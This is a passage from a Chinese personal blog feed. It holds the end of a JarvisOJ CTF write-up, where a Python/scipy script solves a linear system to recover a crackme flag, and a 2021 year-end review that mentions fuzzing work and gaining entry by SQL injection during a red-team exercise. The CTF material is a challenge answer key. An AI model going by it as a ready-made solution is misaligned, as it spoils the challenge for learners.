class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]], n = <span class="number">0</span>; n &lt; <span class="number">25</span>; n++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, a = <span class="number">0</span>; a &lt; <span class="number">25</span>; a++)</span><br><span class="line">                        i += t[a] * o[n][a];</span><br><span class="line">                    <span class="keyword">if</span> (i !== r[n])</span><br><span class="line">                        <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>发现是一个线性方程组</p><p>脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.<span class="property">linalg</span> <span class="keyword">import</span> solve</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">r = np.<span class="title function_">array</span>([<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>])</span><br><span class="line">o = np.<span class="title function_">array</span>([[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]])</span><br><span class="line">x = <span class="title function_">solve</span>(o,r)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="title function_">len</span>(x)):</span><br><span class="line">       char = <span class="title function_">chr</span>(<span class="title function_">int</span>(<span class="title function_">round</span>((x[i]))))</span><br><span class="line">       flag += char</span><br><span class="line"><span class="title function_">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到 flag</p><blockquote><p>这次回过头重新做一遍，整理 wp 真的是体会到温故知新的感觉了，一年前做得懵懵的题目，现在重新理解起来也不那么困难了</p><blockquote><p>参考 wp<a href="https://cloud.tencent.com/developer/article/1038017">Jarvis-OJ平台多题WriteUp分享</a></p><p><a href="https://blog.csdn.net/qq_31481187/article/details/53189113">JarvisOJ Web&amp;Reverse&amp;Pwn</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/77284684">jarvis oj  Web   By   Assassin</a></p><p><a href="https://blog.csdn.net/weixin_30596735/article/details/95187913?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-9.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-9.baidujs">jarvis OJ WEB题目writeup</a></p><p><a href="https://blog.csdn.net/xiaorouji/article/details/81675992?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-10.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-10.baidujs">jarvis oj（web wp）</a></p><p><a href="https://skysec.top/2017/08/16/jarvisoj-web/#61dctf-babyphp">jarvisoj-web</a></p></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JarvisOJ&amp;Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么一个技术仔决定走上考研路</title>
      <link href="/posts/25575/"/>
      <url>/posts/25575/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021年终总结</title>
      <link href="/posts/8569/"/>
      <url>/posts/8569/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p> 2021 一年走下来，感觉就好像走到了人生的又一个拐点，跟高三那年一样。</p></blockquote><blockquote><p><del>2021.12.28 更新</del>了个寂寞</p><p>2021.12.31 凌晨更新</p><p>考试背不完了，事情忙不完了，<del>太想摆烂了</del>，等 1.6 去松山湖找鹏神玩回来以后再更新完整版</p><p>2022.1.12 正式开写</p></blockquote><h1 id="rm-flag-touch-flag"><a href="#rm-flag-touch-flag" class="headerlink" title="rm flag ; touch flag"></a>rm flag ; touch flag</h1><p>惯例这里放着自己在新的一年里的目标与期望，同时也对上一年的 flag 进行总结</p><h2 id="2021-年都说过什么蠢话呢？"><a href="#2021-年都说过什么蠢话呢？" class="headerlink" title="2021 年都说过什么蠢话呢？"></a>2021 年都说过什么蠢话呢？</h2><ul><li><p><input checked="" disabled="" type="checkbox"> <strong>好好吃饭，好好上课，好好睡觉，务必做到</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>转型二进制选手，<del>web也不能落下</del></strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>学会做开发！学会做开发！学会做开发！！！</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>提高学习效率，尽量少熬夜，不要再困倒在厕所门口的垃圾桶旁边了</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>多读书，同时也要做读书笔记，不然看了就忘，没用</strong></p></li><li><p><input disabled="" type="checkbox"> <strong>争取大二暑假结束去找个实习</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>多打比赛，争取多拿几个奖，争取进一次大比赛的线下赛，两次三次更好！</strong></p></li><li><p><input disabled="" type="checkbox"> <strong>抽点时间出来打游戏陪陪自己，不要只买游戏不玩游戏</strong></p></li><li><p><input disabled="" type="checkbox"> <strong>锻炼身体</strong></p></li></ul><blockquote><p>本以为会有大部分完不成，但是回顾下来居然也完成了很多</p><p>在生活上，去年大部分时间还是有好好睡觉，少部分时间作息失调，考试前几天还是因为拖延症要半通宵来赶，但是自我感觉学习效率和方法有进步。虽然最后还是因为各种原因没有时间和精力玩游戏，但是也陪学长完整通关了一周目的《双人成行》。比较遗憾的就是没有好好锻炼身体，暑假留校坚持跑了半个月步又因为拖延症断掉: (</p><p>在技术上，确实转型成了一名半吊子二进制选手，也跟师傅做了个 fuzz 的小项目，有了自己的一点小理解和之后想要研究的方向（🍎），但是还是比较菜。在一堆大作业和课设里，也学会了一点开发，不至于要别人带，自己也能够 C。同样比较遗憾的是难得进的两次线下赛，一个蓝帽一个国赛，都在广州，然后广州就疫情，线下改线上，两路摄像头是真的蠢，可能是我太霉了 : (  。至于为什么没找实习，因为那时候打算跟扫地僧学长一起去一个毕业学长的公司，最后扫地僧咕了，我也摆了</p></blockquote><h2 id="新年整新活"><a href="#新年整新活" class="headerlink" title="新年整新活"></a>新年整新活</h2><ul><li><input disabled="" type="checkbox"> <strong>好好吃饭，好好上课，好好睡觉</strong></li><li><input disabled="" type="checkbox"> <strong>克服拖延症</strong></li><li><input disabled="" type="checkbox"> <strong>拿下一台 macOS</strong></li><li><input disabled="" type="checkbox"> <strong>空闲时间继续学二进制，尝试复现一些🍎的漏洞</strong></li><li><input disabled="" type="checkbox"> <strong>过大四体测</strong></li><li><input disabled="" type="checkbox"> <strong>装修好自己的房间</strong></li><li><input disabled="" type="checkbox"> <strong>养成一些良好的习惯，比如早睡早起、跑步&#x2F;散步&#x2F;快走</strong></li><li><input disabled="" type="checkbox"> <strong>身体恢复正常</strong></li></ul><blockquote><p>2022.1.17 更新</p><p>多的不说，新的一年继续努力！</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%8D%89%E8%8E%93%E7%86%8A.gif"></p><h1 id="上半年"><a href="#上半年" class="headerlink" title="上半年"></a>上半年</h1><p>上半年相对下半年来说忙一些，因为课是真的多，还有一些项目和比赛。也正是在上半年，突然冒出的考研苗头让我一直在纠结，也经历了一段非常非常迷茫的时期，甚至怀疑过自己是否适合继续搞技术。为了不让自己胡思乱想，只能是想办法让自己忙起来，先做好手头的事，所以上半年的成绩还可以，没怎么逃课和摆烂，还水了点比赛和项目。</p><blockquote><p>2022.1.18 更新</p><p>关于我为什么考研，水了一篇《为什么一个技术仔决定走上考研路》，其实也是从开始到决定的心路历程和思想斗争</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A60403BIEB8QRHXP%60NLRHQX.png"></p></blockquote><h2 id="方班广交会众测"><a href="#方班广交会众测" class="headerlink" title="方班广交会众测"></a>方班广交会众测</h2><p>第一次打，感觉就是挺水的，估计也是打的人少（连我扫地僧师傅都没参加）加上审洞的人有点摆，总结就是逻辑漏洞比较多，最后交上去三个逻辑两个敏感信息泄露，还混了个全国第三名和一张证书，也拿到了职业生涯内最多的一笔奖金，有将近 1800，这笔钱最后成了 iPad pro 的一部分。下半年的没有打，因为那天忙小班的事情忙了一天，不过下半年规定同一学校不同的人不能交同一个洞，大家卷来卷去就是看谁提前踩点和拼手速了。</p><p>最后学院还专门搞个海报摆出来，说实话真的有点夸张了，实在是名不副实，当时我的 web 水平已经停住好久了，逻辑漏洞都是现学现挖的，搞得我都不好意思在五教一楼那边走。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118010821.png" alt="害羞羞"></p><h2 id="某公司-fuzz-项目"><a href="#某公司-fuzz-项目" class="headerlink" title="某公司 fuzz 项目"></a>某公司 fuzz 项目</h2><p>第一次跟公司合作做项目，第一次签劳动合同，第一次线上实习，第一次感受到现实，第一次挨社会的毒打，第一次实习赚钱（1500，也成为了 iPad pro 的一部分）。</p><p>这么多个第一次堆在一起，说实话是有点紧张的，每周的例会都是唯唯诺诺，工作内容比较简单，复现了一些被测程序的历史漏洞，搭 winafl 来跑了一下，找了一下被测程序的历史版本，学了一些 fuzz 相关知识，研究测出来的 bug 并想办法批量产生能造成此 bug 测试用例，仅此而已，但是 fuzz 对我来说是新东西，以前听过没搞过，但是还好有 sivona 师傅 : ) 。最后仅仅测出来一个 bug，测试用例把程序的栈用爆掉了。</p><p>虽说初衷是重在学到东西（虽然最后学到的东西完全是自己自学到的），但是压价压工时还被怀疑真是让人又气又无奈，本来挖洞这种东西就是有一定的时间成本浸没但是不一定有实际产出，加上大家都还需要付出一定的学习成本，最后报上去的工时被线上实习 + 与实际产出不符为理由压下来，还被老板批评。</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%98%BB%E5%98%BB.jpg" alt="" style="zoom:150%;" /><p> sivona 师傅说表示理解，社会就是这么现实，毕竟人家也有理由，线上实习也看不到我们实际在干嘛，二进制漏洞挖掘本身也是有点看天赋，找 100 个人挖，可能还不如一个人的输出高。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A60403BIEB8QRHXP%60NLRHQX.png"></p><p>下半年听说这家公司已经跟桂电达成了比较深的深度合作；听说这家老板非常喜欢用桂电的学生，理由是好用不贵；听说下半年又有新的项目找了一些学弟学妹去。我没有参与，也跟我没啥关系了，因为这时的我已经是一个考研🐕了。</p><h2 id="广西护网"><a href="#广西护网" class="headerlink" title="广西护网"></a>广西护网</h2><p>这次的成绩不太好，感觉就是一年比一年难打，能进去内网的队伍直接内网遨游，突破不了的就只能坐大牢摆大烂，最后好不容易 sql 梭到一个进去了，因为不会写免杀马 思路就又断掉了。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118020854.png" alt="粉饺真好吃"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118022512.png" alt="萝卜干真难吃"></p><p>属于是故地重游了，定的酒店跟去年是同一家，甚至主办方发的饭都跟去年一模一样（尤其是南宁那不咸不淡的萝卜干），但是今年是跟学弟学妹一起，最后结束的时候大家还一起海底捞，挺开心的。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118021643.png" alt="跟学弟恰烧烤"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118021829.png" alt="最后一天海底捞"></p><p>期间还跟在西大的高中同学小聚了一场</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118021555.png" alt="老友聚餐"></p><p>此外还认识了在桂林网安的学长，和梦极光蒋学长吃饭还见到了协会曾经的 ming 神，跟前辈们聊天、讨论也学到了不少东西，总的来说还是很有意义的。</p><p>跟扫地僧学长买彩票还中了不少，虽然最后都是亏，但是好歹中过奖。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118022657.png" alt="好运连连"></p><h2 id="离别时刻"><a href="#离别时刻" class="headerlink" title="离别时刻"></a>离别时刻</h2><p>护网回来就又到了每年的毕业送别学长学姐的环节了，今年毕业了一对学长学姐，豆子爹去了菊厂，豆子妈去了鹅厂，小豆子一度成为贵协身价最高</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118023116.png" alt="可爱的小豆子"></p><p>记得很清楚的是那天有人玩密室逃脱中途被吓得不行了叫撤退，记得那天澳门酒家的饭菜很好吃 吃的很饱，记得那天 KTV 大家一起唱歌很开心，不过记得最清楚的是最后跟学弟和学姐去屋顶喝酒，学弟喝醉了跟我一直说要努力打 CTF，明年要进强网杯线下，还说拒绝了找上门来的 py，2021 最感动时刻莫过于此，当时差点就哭了，最后从校门口两个人一歪一倒相互搀扶回去进门就倒下 想想就好笑。</p><p><img 